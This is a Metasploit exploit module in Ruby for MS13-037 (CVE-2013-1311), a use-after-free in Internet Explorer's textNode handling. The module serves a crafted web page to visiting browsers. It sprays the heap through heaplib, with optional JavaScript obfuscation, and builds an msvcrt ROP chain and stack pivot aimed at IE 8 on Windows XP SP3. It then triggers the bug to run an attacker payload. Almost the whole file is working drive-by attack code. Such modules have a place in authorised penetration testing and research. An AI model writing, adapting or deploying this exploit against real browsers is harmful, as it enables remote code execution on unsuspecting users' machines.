# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::RopDb

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "MS13-037 Microsoft Internet Explorer textNode Use-After-Free",
      &#039;Description&#039;    => %q{
        This module exploits a use-after-free vulnerability in Microsoft Internet Explorer
        where a DOM textNode pointer becomes corrupted after style computation. This pointer is then overwritten when the innerHTML property on the parent object is set.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Scott Bell <scott.bell@security-assessment.com>&#039; # Vulnerability discovery & Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2013-1311&#039; ],
          [ &#039;MSB&#039;, &#039;MS13-037&#039; ],
          [ &#039;URL&#039;, &#039;http://security-assessment.com/files/documents/advisory/ms13_037_ie_textnode_uaf.pdf&#039; ]
        ],
      &#039;Payload&#039;    =>
        {
          &#039;BadChars&#039;       => "\x00",
          &#039;Space&#039;          => 812,
          &#039;DisableNops&#039;    => true,
          &#039;PrependEncoder&#039; => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;
        },
      &#039;Platform&#039;    => &#039;win&#039;,
      &#039;Targets&#039;    =>
        [
          [ &#039;Automatic&#039;, {} ],
          [ &#039;IE 8 on Windows XP SP3&#039;, { &#039;Rop&#039; => :msvcrt, &#039;Offset&#039; => 0x5f4 } ]
        ],
      &#039;Privileged&#039;    => false,
      &#039;DisclosureDate&#039;  => "June 6 2013",
      &#039;DefaultTarget&#039;   => 0))

    register_options(
      [
        OptBool.new(&#039;OBFUSCATE&#039;, [false, &#039;Enable JavaScript obfuscation&#039;, false])
      ], self.class)

  end

  def get_target(agent)
    #If the user is already specified by the user, we&#039;ll just use that
    return target if target.name != &#039;Automatic&#039;

    nt = agent.scan(/Windows NT (\d\.\d)/).flatten[0] || &#039;&#039;
    ie = agent.scan(/MSIE (\d)/).flatten[0] || &#039;&#039;

    ie_name = "IE #{ie}"

    case nt
    when &#039;5.1&#039;
      os_name = &#039;Windows XP SP3&#039;
    end

    targets.each do |t|
      if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))
        print_status("Target selected as: #{t.name}")
        return t
      end
    end

    return nil
  end

  def heap_spray(my_target, p)
    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))
    js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(target.arch))

    js = %Q|

      var heap_obj = new heapLib.ie(0x20000);
      var code = unescape("#{js_code}");
      var nops = unescape("#{js_nops}");
      while (nops.length < 0x80000) nops += nops;
      var offset = nops.substring(0, #{my_target[&#039;Offset&#039;]});
      var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);
      while (shellcode.length < 0x40000) shellcode += shellcode;
      var block = shellcode.substring(0, (0x80000-6)/2);
      heap_obj.gc();
      for (var i=1; i < 0x300; i++) {
        heap_obj.alloc(block);
      }
      var overflow = nops.substring(0, 10);

    |

    js = heaplib(js, {:noobfu => true})

    if datastore[&#039;OBFUSCATE&#039;]
      js = ::Rex::Exploitation::JSObfu.new(js)
      js.obfuscate

    end

    return js
  end

  def get_payload(t, cli)
    code = payload.encoded

    # No rop. Just return the payload.
    return code if t[&#039;Rop&#039;].nil?

    # ROP chain generated by mona.py - See corelan.be
    case t[&#039;Rop&#039;]
    when :msvcrt
      print_status("Using msvcrt ROP")

      stack_pivot = [
      0x77c1cafb, # POP EBP # RETN [msvcrt.dll]
      0x41414141, # Junk
      0x781a04cb # POP ECX # PUSH ESP # RETN [urlmon.dll]
      ].pack("V*")

      # Set up required heap layout
      junk = "#{Rex::Text.rand_text_alpha(4)}"
      null = "\x00"*4
      valid_ptr = [0x0c0c0c0c].pack("V*")
      offset = [0x0c0c0c6c].pack("V*")
      heap_foo = junk*5 +
        valid_ptr*2 +
        junk +
        offset +
        junk*4 +
        valid_ptr +
        junk*6 +
        valid_ptr +
        null +
        junk*2

      rop_payload = heap_foo << generate_rop_payload(&#039;msvcrt&#039;, "", {&#039;pivot&#039;=>stack_pivot, &#039;target&#039;=>&#039;xp&#039;})
      rop_payload << code
    end

    return rop_payload
  end

  def get_exploit(my_target, cli)
    p  = get_payload(my_target, cli)
    js = heap_spray(my_target, p)

    html = %Q|
    <!doctype html>
    <html>
    <head>
    <script>
    #{js}
    function exploit() {
      var obj = document.createElement(&#039;s&#039;)
      obj.innerHTML = "⍼☠"
      document.body.appendChild(obj)

      document.styleSheets[0].cssText = "body:first-line{color:blue}"
      CollectGarbage()

      setTimeout(function(){
        for (i=0;i<1000;i++){
          obj.innerHTML = "\\u0c2c\\u0c0c\\u0c0c\\u0c0c\\u0c0c\\u0c0c\\u0c0c\\u0c0c";
        }
      }, 500)
    }
    </script>
    <style>
    </style>
    </head>
    <body onload=&#039;setTimeout("exploit()", 2000)&#039;>
    </body>
    </html>
    |

    return html
  end


  def on_request_uri(cli, request)
    agent = request.headers[&#039;User-Agent&#039;]
    uri   = request.uri
    print_status("Requesting: #{uri}")

    my_target = get_target(agent)
    # Avoid the attack if no suitable target found
    if my_target.nil?
      print_error("Browser not supported, sending 404: #{agent}")
      send_not_found(cli)
      return
    end

    html = get_exploit(my_target, cli)
    html = html.gsub(/^\t\t/, &#039;&#039;)
    print_status "Sending HTML..."
    send_response(cli, html, {&#039;Content-Type&#039;=>&#039;text/html&#039;})

  end

end

